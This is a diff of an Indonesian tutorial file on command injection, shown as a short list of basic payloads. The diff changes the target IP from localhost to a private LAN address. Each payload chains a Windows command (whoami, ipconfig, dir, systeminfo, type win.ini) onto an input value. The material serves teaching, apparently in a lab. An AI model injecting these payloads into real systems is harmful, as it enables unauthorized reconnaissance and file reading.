@@ -3,23 +3,23 @@ Command Injection adalah kerentanan yang terjadi ketika aplikasi web meneruskan 
 ## payload dasar 
 melihat user web server
 ```bash
-127.0.0.1 & whoami 
+192.168.68.169 & whoami 
 ```
 Lihat konfigurasi IP
 ```bash
-127.0.0.1 & ipconfig
+192.168.68.169 & ipconfig
 ```
 List isi drive C
 ```bash
-127.0.0.1 & dir C:\
+192.168.68.169 & dir C:\
 ```
 Informasi sistem lengkap
 ```bash
-127.0.0.1 & systeminfo
+192.168.68.169 & systeminfo
 ```
 Baca file sistem
 ```bash
-127.0.0.1 & type C:\Windows\win.ini
+192.168.68.169 & type C:\Windows\win.ini
 ```
 
 
